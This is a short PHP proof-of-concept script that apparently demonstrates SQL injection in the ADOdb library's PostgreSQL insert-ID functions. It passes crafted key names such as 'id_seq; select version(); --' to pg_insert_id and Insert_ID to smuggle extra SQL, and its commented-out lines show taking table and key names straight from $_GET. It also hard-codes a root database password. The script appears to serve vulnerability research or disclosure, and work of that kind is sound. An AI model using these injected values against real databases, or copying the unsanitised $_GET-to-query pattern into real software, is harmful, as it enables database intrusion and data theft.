<?php

// Include the ADOdb library
require 'adodb.inc.php'; // If installed via Composer
// require_once 'adodb5/adodb.inc.php'; // If manually downloaded

// Connection parameters
$host = 'localhost';
$dbname = 'dregad';
$user = 'root';
$password = 'C0yote71';


// Create a connection object
$db = NewADOConnection('postgres'); // Use PostgreSQL driver

// Enable debugging (optional)
$db->debug = true;

// Establish the connection
$db->Connect($host, $user, $password, $dbname);

$table = 'poc';
$result = $db->Execute("INSERT INTO $table (name) VALUES ('test')");
echo $db->pg_insert_id($table, 'id') . "\n";
echo $db->pg_insert_id($table, 'id_seq; select version(); --');
die;
// Check connection status
if (!$db->IsConnected()) {
	die("Database connection failed: " . $db->ErrorMsg());
} else {
	echo 'Database OK<br>';
}

// Define the table and primary key column
//$table = $_GET['table']; // Replace with your table name
//$primary_key = $_GET['id']; // Replace with your primary key column
$table = 'poc'; // Replace with your table name
//$primary_key = 'id';
$primary_key = 'id_seq; select version(); --';
// Prepare an INSERT statement to prevent SQL injection
$sql = "INSERT INTO $table (name) VALUES ('test')";

// Execute the query with actual values
$result = $db->Execute($sql);

if (1) {
	// Retrieve the last inserted ID using getLastInsertID()
	$last_id = $db->pg_insert_id($table, $primary_key);

	if ($last_id) {
		echo "Last inserted ID: " . $last_id;
	} else {
		echo "Insert operation failed: " . $db->ErrorMsg();
	}
}

var_dump( $db->Insert_ID());
$primary_key = "id')), version(); --";
var_dump( $db->Insert_ID($table, $primary_key));
// Close the connection
$db->Close();
